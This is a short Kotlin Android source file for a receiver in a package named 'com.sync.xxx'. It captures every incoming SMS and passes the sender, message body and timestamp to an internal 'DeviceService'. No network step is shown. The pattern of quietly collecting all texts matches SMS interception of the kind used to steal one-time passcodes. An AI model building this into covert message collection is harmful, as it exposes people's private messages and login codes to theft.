package com.sync.xxx

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import org.json.JSONObject

class SmsForwardReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "SmsForwardReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return
        
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        
        try {
            val messages = extractMessages(intent)
            
            messages.forEach { sms ->
                val sender = sms.displayOriginatingAddress ?: "Unknown"
                val messageBody = sms.messageBody ?: ""
                val timestamp = sms.timestampMillis
                
                Log.d(TAG, "SMS received from: $sender")
                
                // Forward to DeviceService
                forwardSmsToService(context, sender, messageBody, timestamp)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing SMS: ${e.message}")
        }
    }

    private fun extractMessages(intent: Intent): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                // Modern approach (API 19+)
                val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                messages.addAll(smsMessages)
            } else {
                // Legacy approach (API < 19)
                @Suppress("DEPRECATION")
                val pdus = intent.extras?.get("pdus") as? Array<*>
                pdus?.forEach { pdu ->
                    val message = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        val format = intent.getStringExtra("format")
                        SmsMessage.createFromPdu(pdu as ByteArray, format)
                    } else {
                        @Suppress("DEPRECATION")
                        SmsMessage.createFromPdu(pdu as ByteArray)
                    }
                    message?.let { messages.add(it) }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error extracting SMS: ${e.message}")
        }
        
        return messages
    }

    private fun forwardSmsToService(context: Context, sender: String, message: String, time: Long) {
        try {
            // Broadcast to DeviceService
            val intent = Intent("com.sync.xxx.SMS_FORWARD")
            intent.setPackage(context.packageName)
            intent.putExtra("sender", sender)
            intent.putExtra("message", message)
            intent.putExtra("time", time)
            context.sendBroadcast(intent)
            
            Log.d(TAG, "SMS forwarded to service")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to forward SMS: ${e.message}")
        }
    }
}
